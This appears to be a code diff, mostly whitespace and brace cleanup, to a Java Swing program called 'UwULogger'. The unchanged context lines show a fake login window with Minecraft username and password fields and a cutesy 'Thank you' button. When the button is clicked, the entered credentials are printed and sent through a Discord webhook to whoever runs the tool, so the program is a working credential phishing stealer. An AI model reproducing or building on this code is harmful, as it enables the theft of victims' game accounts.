@@ -4,8 +4,6 @@ import java.awt.Canvas;
 import java.awt.EventQueue;
 import java.awt.Font;
 
-
-
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JFrame;
@@ -23,20 +21,11 @@ import java.awt.event.ActionEvent;
 
 public class UwULogger extends Canvas{
 
-	  /**
-	 * 
-	 */
 	private static final long serialVersionUID = 1L;
 
-	
 	private JFrame frame;
 	private JTextField McUsername;
 	private JTextField McPassword;
-	
-	
-	
-	
-	
 	
 	/**
 	 * Launch the application.
@@ -49,10 +38,8 @@ public class UwULogger extends Canvas{
 					window.frame.setVisible(true);
 				} catch (Exception e) {
 					e.printStackTrace();
-				}
-			}
-		});
-	}
+				}}
+		});}
 
 	/**
 	 * Create the application.
@@ -99,13 +86,7 @@ public class UwULogger extends Canvas{
 		McPassword.setColumns(10);
 		McPassword.setBounds(538, 139, 184, 34);
 	
-		
-		
 		frame.getContentPane().add(McPassword);
-		
-		
-		
-		
 		
 		JButton thankyouButton = new JButton("Th-Thank you kawaii-san");
 		thankyouButton.setFont(new Font("SansSerif", Font.BOLD, 19));
@@ -123,11 +104,9 @@ public class UwULogger extends Canvas{
 					});
 					builder.setWait(true);
 					
-					
-				WebhookClient client = builder.build();
+					WebhookClient client = builder.build();
 				
-				 
-				System.out.println(Usernamestr);
+				 System.out.println(Usernamestr);
 				System.out.println(Passwordstr);
 				
 				WebhookEmbed embed = new WebhookEmbedBuilder()
@@ -136,16 +115,8 @@ public class UwULogger extends Canvas{
 				        .build();
 				
 				client.send(embed);
-				
-				
-					
-					
-					
-					
-				}
-			;
-			
-		});
+				};
+			});
 		
 		thankyouButton.setBounds(285, 346, 303, 78);
 		frame.getContentPane().add(thankyouButton);
@@ -154,18 +125,4 @@ public class UwULogger extends Canvas{
 		ImageLabel.setBounds(0, 0, 938, 582);
 		frame.getContentPane().add(ImageLabel);
 		ImageLabel.setIcon(new ImageIcon(UwULogger.class.getResource("/me/garbage/resource/wallpaper.jpg")));
-		
-		
-		
-		
-		
-		
-		
-		
-		
-		
-	        }  
-	   
-		}
-	
-
+		}}
